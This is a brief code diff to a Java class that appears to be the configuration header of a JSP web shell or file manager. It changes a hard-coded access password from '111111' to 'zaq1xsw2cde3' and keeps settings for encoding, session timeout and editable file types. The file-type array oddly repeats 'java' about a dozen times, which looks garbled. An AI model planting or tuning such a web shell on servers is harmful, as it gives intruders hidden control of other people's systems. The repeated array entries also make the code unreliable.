@@ -22,7 +22,7 @@
 
 
 
-private String _password = "111111";
+private String _password = "zaq1xsw2cde3";
 private String _encodeType = "GBK";
 private int _sessionOutTime = 20;
 private String[] _textFileTypes = {"txt", "htm", "html", "asp", "jsp", "js", "css", "c", "cpp", "sh", "pl", "cgi", "php", "conf", "xml", "xsl", "ini", "vbs", "inc", "java", "java", "java", "java", "java", "java", "java", "java", "java", "java", "java", "java"};
